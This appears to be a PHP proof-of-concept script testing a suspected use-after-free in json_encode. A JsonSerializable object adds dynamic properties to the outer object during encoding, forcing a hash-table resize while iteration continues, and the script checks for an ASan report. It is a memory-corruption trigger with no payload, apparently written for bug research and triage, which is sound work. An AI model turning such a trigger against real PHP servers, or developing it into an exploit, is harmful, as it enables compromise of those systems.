<?php
/**
 * Candidate: json_encode() use-after-free via live object-properties HashTable
 * resize.
 *
 * Premise (ext/json/json_encoder.c, php_json_encode_array):
 *   - For a non-hooked object (stdClass), zend_get_properties_for(val,
 *     ZEND_PROP_PURPOSE_JSON) returns the LIVE obj->properties HashTable.
 *   - ZEND_HASH_FOREACH_KEY_VAL_IND caches arData + nNumUsed at loop start.
 *   - A nested JsonSerializable::jsonSerialize() that adds dynamic properties to
 *     the OUTER object triggers zend_hash_do_resize(), freeing/moving the old
 *     arData while the FOREACH cursor still points at it -> UAF read on the next
 *     bucket.
 *
 * Under USE_ZEND_ALLOC=0 + ASan, if real, this reports heap-use-after-free in
 * the json encode FOREACH.
 */
class Trigger implements JsonSerializable {
    private stdClass $victim;
    public function __construct(stdClass $v) { $this->victim = $v; }
    public function jsonSerialize(): mixed {
        // Add enough dynamic props to the OUTER object to force a resize of the
        // very HashTable json is iterating.
        for ($i = 0; $i < 32; $i++) {
            $this->victim->{"p$i"} = str_repeat("X", 32);
        }
        return "trigger_done";
    }
}

$victim = new stdClass();
$victim->trigger = new Trigger($victim);          // bucket[0] -> fires resize
$victim->canary  = "CANARY_VALUE_FROM_ARDATA";    // bucket[1] -> read after free

fwrite(STDERR, "[*] props before: " . count(get_object_vars($victim)) . "\n");
$json = json_encode($victim);
fwrite(STDERR, "[*] props after : " . count(get_object_vars($victim)) . "\n");
fwrite(STDERR, "[*] json length : " . strlen((string)$json) . "\n");
fwrite(STDERR, "[*] no ASan abort\n");
